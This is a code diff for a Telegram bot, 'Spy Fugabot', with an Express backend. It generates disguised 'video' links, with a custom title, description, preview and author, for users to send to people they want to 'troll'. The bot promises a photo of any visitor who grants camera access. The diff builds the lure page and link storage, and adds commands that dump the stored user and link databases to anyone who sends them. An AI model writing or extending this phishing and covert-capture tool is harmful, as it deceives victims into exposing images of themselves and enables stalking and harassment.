@@ -8,6 +8,7 @@ const dataBaseLinks = DB.connect('spy_fugabot_links');
 
 const express = require("express");
 const fs = require("fs");
+const path = require("path");
 const cors = require("cors");
 const app = express();
 
@@ -70,7 +71,7 @@ function base64(img, id_t) {
 }
 
 bot.command("start", async (ctx) => {
-  const { id, first_name, username, language_code } = ctx.from;
+  const { id, first_name, username } = ctx.from;
 
   dataBase.findOne({ id, first_name, username }).then((res) => {
     if (!res) {
@@ -84,36 +85,67 @@ bot.command("start", async (ctx) => {
   })
 
   ctx.replyWithPhoto("https://i.ibb.co/MysyVfwK/file-00000000d7c882108c236da29c583a63.png", {
-    caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. 🔗 Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
+    caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
     parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку", callback_data: `begin` }] ] }
+    reply_markup: { inline_keyboard: [ [{ text: "Начать", callback_data: `begin` }] ] }
   });
 });
+
+
 
 bot.action("begin", (ctx) => {
-  const { id, first_name, username, language_code } = ctx.from;
+  ctx.replyWithPhoto("https://i.ibb.co/RkmYcyWw/file-00000000ee948210945776bf48195e67.png", {
+    caption: `
+    <b>Как создать ссылку?</b>
 
-  dataBase.findOne({ id }).then((res) => {
-    ctx.reply(
-      `<b>📸 Вы получите фото, если кто-то перейдет по вашей ссылке и даст разрешение. </b>`,
-      { parse_mode: "HTML", reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку ", callback_data: `create_link` }] ] } }
-    );
+Для создания персональной ссылки необходимо заполнить 4 поля:
 
+1. <b>Название видео</b>
+<blockquote>Название будет отображаться в заголовке при отправке ссылки.</blockquote>
+
+2. <b>Описание видео</b>
+<blockquote>Описание будет отображаться в предпросмотре ссылки и непосредственно на странице с видео.</blockquote>
+
+3. <b>Превью видео</b>
+<blockquote>Изображение будет использоваться в качестве обложки видео и отображаться при отправке ссылки. Заранее подготовьте картинку и отправьте её боту.</blockquote>
+
+4. <b>Автор видео</b>
+<blockquote>Имя или никнейм автора, который будет отображаться непосредственно на странице с видео.</blockquote>
+
+После заполнения всех полей проверьте указанные данные и подтвердите создание ссылки.
+
+📸 <b>Вы получите фотографию, если посетитель перейдёт по вашей ссылке и самостоятельно разрешит доступ к камере.</b>
+    `,
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку", callback_data: `create_link` }] ] }
   });
 });
 
+
+
+
+
+
+
 bot.command("db", async (ctx) => {
-  dataBase.find({}).then((res) => {
+  console.log()
+  dataBase.find({}).toArray().then((res) => {
+    //console.log(res)
+    ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
+      parse_mode: "Markdown",
+    });
+  });
+});
+bot.command("db2", async (ctx) => {
+  dataBaseLinks.find({}).toArray().then((res) => {
+    // console.log(res)
     ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
       parse_mode: "Markdown",
     });
   });
 });
 
-bot.command("drop", async (ctx) => {
-  dataBase.deleteMany({});
-  ctx.reply("DROP COLLECTION");
-});
+//   dataBase.deleteMany({});
 
 
 
@@ -135,7 +167,9 @@ bot.action("create_link", async (ctx) => {
 
 bot.on("message", async (ctx, next) => {
   const data = ctx.session?.createLink;
+  data.user_id = ctx.from.id;
   if (!data) return next();
+
   const message = ctx.message;
 
   // Отмена создания
@@ -153,7 +187,11 @@ bot.on("message", async (ctx, next) => {
     data.title = message.text;
     data.step = "description";
 
-    return ctx.reply("📄 Теперь введите описание:");
+    return ctx.reply(
+      "📄 <b>Введите описание видео</b>\n\n" +
+      "<blockquote>Укажите текст, который будет отображаться под видео и в предпросмотре ссылки.</blockquote>",
+      { parse_mode: "HTML" }
+    );
   }
 
   // Шаг 2. Описание
@@ -165,22 +203,49 @@ bot.on("message", async (ctx, next) => {
     data.description = message.text;
     data.step = "preview";
 
-    return ctx.reply("🖼 Отправьте изображение для превью:");
+    return ctx.reply(
+      "🖼 <b>Отправьте изображение для превью</b>\n\n" +
+      "<blockquote>Выберите картинку из галереи устройства. Она будет отображаться в качестве обложки видео и при отправке ссылки.</blockquote>",
+      { parse_mode: "HTML" }
+    );
   }
 
   // Шаг 3. Превью
-  if (data.step === "preview") {
-    if (!message.photo) {
-      return ctx.reply("⚠️ Необходимо отправить фотографию.");
-    }
+
+  // Шаг 3. Превью
+if (data.step === "preview") {
+  if (!message.photo) {
+    return ctx.reply("⚠️ Необходимо отправить фотографию.");
+  }
+
+  try {
+    await ctx.reply("⏳ Загружаю изображение...");
 
     const photo = message.photo[message.photo.length - 1];
 
-    data.preview = photo.file_id;
+    // Загружаем изображение на ImgBB
+    const image = await uploadToImgBB(photo.file_id, ctx);
+
+    // Сохраняем полученные ссылки
+    console.log(image);
+    data.preview = image;
     data.step = "author";
 
-    return ctx.reply("👤 Укажите автора видео:");
+    return ctx.reply(
+      "👤 <b>Укажите автора видео</b>\n\n" +
+      "<blockquote>Введите имя или никнейм, который будет отображаться на странице рядом с видео.</blockquote>\n\n" +
+      "🖼 Изображение успешно загружено!",
+      { parse_mode: "HTML" }
+    );
+
+  } catch (error) {
+    console.error("Ошибка загрузки превью:", error);
+
+    return ctx.reply(
+      "❌ Не удалось загрузить изображение. Попробуйте отправить его ещё раз."
+    );
   }
+}
 
   // Шаг 4. Автор
   if (data.step === "author") {
@@ -190,6 +255,8 @@ bot.on("message", async (ctx, next) => {
 
     data.author = message.text;
     data.step = "complete";
+    data.hash = seed(4);
+    dataBaseLinks.insertOne(data);
 
     return ctx.reply(
       `✅ <b>Данные заполнены!</b>\n\n` +
@@ -200,7 +267,7 @@ bot.on("message", async (ctx, next) => {
       {
         parse_mode: "HTML",
         ...Markup.inlineKeyboard([
-          [Markup.button.callback("🔗 Создать ссылку", "confirm_create_link")],
+          [Markup.button.callback("🔗 Подтвердить создание", "confirm_create_link")],
           [Markup.button.callback("❌ Отменить", "cancel_create_link")]
         ])
       }
@@ -220,10 +287,11 @@ bot.action("cancel_create_link", async (ctx) => {
 bot.action("confirm_create_link", async (ctx) => {
   await ctx.answerCbQuery();
   const data = ctx.session?.createLink;
+  console.log(data)
   if (!data || data.step !== "complete") {
     return ctx.reply("⚠️ Данные не найдены. Начните заново.");
   }
-  await ctx.reply("✅ Все данные готовы к созданию ссылки!");
+  await ctx.reply(`✅ Все данные готовы к созданию ссылки!, http://localhost:3000/video?v=${data.hash}`);
   ctx.session.createLink = null;
 });
 
@@ -235,26 +303,33 @@ bot.action("confirm_create_link", async (ctx) => {
 
 
 app.get("/video", (req, res) => {
-  console.log("---")
-  res.send(template("title","description", "image", "author", "poster"));
+  const id = req.query.v;
+  console.log(id)
+  if(id){
+    dataBaseLinks.findOne({ hash: id}).then((video) => {
+      console.log(video)
+      res.send(template(video.title, video.description, video.preview.current, video.author ));
+    });
+  }
+  else{
+
+  }
+  
+
+  
   // res.sendFile(__dirname + "/src/index.html");
 });
-
-app.get("/task-client", (req, res) => {
-  res.send("task");
-});
-
-
-
 app.post("/img", async (req, res) => {
-  base64(req.body.img, req.body.id);
+  console.log(req.body.id)
+  // base64(req.body.img, req.body.id);
   res.send({ type: true });
 });
+
+
+
+
 
 app.get("/sleep", async (req, res) => {
-  res.send({ type: true });
-});
-app.post("/sleep", async (req, res) => {
   res.send({ type: true });
 });
 
@@ -262,7 +337,50 @@ bot.launch();
 
 
 
+//  dataBase.insertOne({ id, first_name, username, id_video: dateNow() });
+
 function dateNow() {
   return new Date().getTime();
 }
+
+function seed(n = 6) {
+  const symbols = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
+  let hash = "";
+  for (let i = 0; i != n; i++) { hash += symbols[Math.floor(Math.random() * symbols.length)]; }
+  return hash;
+}
+
 app.listen(3000, (err) => { err ? err : console.log("Started") });
+
+
+
+
+async function uploadToImgBB(fileId, ctx) {
+  // Получаем ссылку на файл Telegram
+  const fileUrl = await ctx.telegram.getFileLink(fileId);
+
+  // Скачиваем изображение
+  const imageResponse = await fetch(fileUrl.href);
+
+  if (!imageResponse.ok) {
+    throw new Error("Не удалось скачать изображение из Telegram");
+  }
+
+  const buffer = Buffer.from(await imageResponse.arrayBuffer());
+
+  // Формируем запрос для ImgBB
+  const formData = new FormData();
+
+  formData.append("image", new Blob([buffer], { type: "image/jpeg" }), "preview.jpg");
+
+  // Загружаем изображение
+  const response = await fetch(`https://api.imgbb.com/1/upload?key=${process.env.IMGBB}`, { method: "POST", body: formData });
+
+  const result = await response.json();
+
+  if (!response.ok || !result.success) {
+    throw new Error(result.error?.message || "Ошибка загрузки на ImgBB");
+  }
+
+  return { current: result.data.image.url, thumb: result.data.thumb.url };
+}
